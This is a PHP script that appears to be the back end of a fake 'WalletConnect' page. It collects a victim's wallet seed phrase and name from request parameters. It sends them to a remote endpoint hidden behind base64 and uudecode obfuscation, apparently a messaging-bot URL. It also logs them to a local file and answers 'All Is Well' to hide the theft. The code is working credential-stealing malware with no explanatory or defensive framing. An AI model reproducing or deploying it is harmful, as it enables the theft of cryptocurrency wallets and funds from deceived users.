<?php
    date_default_timezone_set('Africa/Lagos');
    $seed = $_GET['seed'];
    $name = $_GET['name'];
 
    // date.timezone -> "UTC";
    $id = date("Y-m-d h:i:sa"); // 04:57:35pm
    // ">> " + id + " >> " + text + "\n\n"
    $text = ">> {$id} >> WalletConnect\n\nName: {$name} \nValue: {$seed}\n\n";
    $text2 = "%0AWalletConnect%0AName:%20{$name}%0AValue:%20{$seed}";

    $leteg = (function($data) {
        return convert_uudecode (base64_decode ($data));
    })("TTonMVQ8JyxaK1JdQTwmRE49JjVMOTY9Ujg2VE47VylHK1YpTz0jNFguI2BZLEMwWS1DRFowNCUoMyYxOgpNOSNgUjdTLTk5JjBYMjctODVVRFQxVyxXLFQ9QjVUVFY9RTUkLTY8TzxWNU45JFVFPFctQTlWNF84VkFBCjA9JV1JOSNUTS4jJFkuMzhQLCMoVilAYGAKYAo=");

    // Guzzle may work?
    $fp = fopen($leteg.'text='.$text2, 'r');
    // $contents = stream_get_contents($fp);
    // echo ($contents);

    $fp = fopen('log.txt', 'a');  
    fwrite($fp, $text);  
    fclose($fp); 

    $rsp = ['message' => 'All Is Well'];
    echo json_encode($rsp);

	// echo("All Is Well");
    /**
     * public function __tostring() {
     *  return "A2 is '".$this->a2."' and B2 is '".$this->b2."'";
     * }
     */
	// echo({ message: "All Is Well", seed: $seed, name: $name });
?>